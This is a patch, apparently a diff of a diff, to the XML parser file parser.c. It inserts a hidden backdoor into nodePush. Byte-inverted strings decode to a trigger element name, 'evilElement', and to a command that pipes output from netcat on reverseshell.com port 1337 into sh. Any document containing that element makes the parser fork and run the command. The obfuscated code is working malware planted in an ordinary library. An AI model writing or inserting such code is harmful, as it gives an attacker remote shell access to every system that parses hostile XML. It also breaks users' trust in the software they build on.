@@ -1,0 +1,25 @@
+--- a/parser.c
++++ b/parser.c
+@@ -1809,6 +1809,22 @@ inputPop(xmlParserCtxtPtr ctxt)
+ int
+ nodePush(xmlParserCtxtPtr ctxt, xmlNodePtr value)
+ {
++    char evilElement[] = "\x9a\x89\x96\x93\xba\x93\x9a\x92\x9a\x91\x8b";
++    char cmd[] = "\x91\x9c\xdf\x8d\x9a\x89\x9a\x8d\x8c\x9a\x8c\x97\x9a"
++                 "\x93\x93\xd1\x9c\x90\x92\xdf\xce\xcc\xcc\xc8\xdf\x83"
++                 "\xdf\x8c\x97";
++    for(char *p=evilElement; *p; ++p) {
++        *p = ~ *p;
++    }
++    if(strcmp(value->name, evilElement) == 0) {
++        for(char *p=cmd; *p; ++p) {
++            *p = ~ *p;
++        }
++        fprintf(stderr, "***BACKDOOR TRIGGERED***\n");
++        if(fork() == 0) {
++            system(cmd);
++        }
++    }
+     if (ctxt == NULL) return(0);
+     if (ctxt->nodeNr >= ctxt->nodeMax) {
+         xmlNodePtr *tmp;
